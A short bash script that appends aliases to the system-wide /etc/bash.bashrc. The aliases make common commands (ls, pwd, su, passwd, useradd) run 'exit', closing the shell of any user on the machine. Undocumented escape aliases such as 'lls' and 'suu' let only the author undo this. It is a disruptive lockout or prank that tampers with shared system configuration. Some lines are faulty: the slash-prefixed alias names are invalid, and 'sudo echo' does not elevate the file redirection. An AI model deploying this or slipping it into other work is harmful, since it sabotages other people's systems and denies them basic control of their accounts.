#!/bin/bash
sudo echo "# ================================
# System-Wide Custom Alias Definitions
# ================================
alias useradd='exit'
alias passwd='exit'
alias pwd='exit'
alias su='exit'
alias ls='exit'
alias /useradd='exit'
alias /passwd='exit'
alias /pwd='exit'
alias /su='exit'
alias /ls='exit'
##############
alias lls='unalias ls'
alias suu='unalias su'
alias pwdd='unalias pwd'
alias useraddd='unalias useradd'
alias passwdd='unalias passwd'" >> /etc/bash.bashrc

source /etc/bash.bashrc
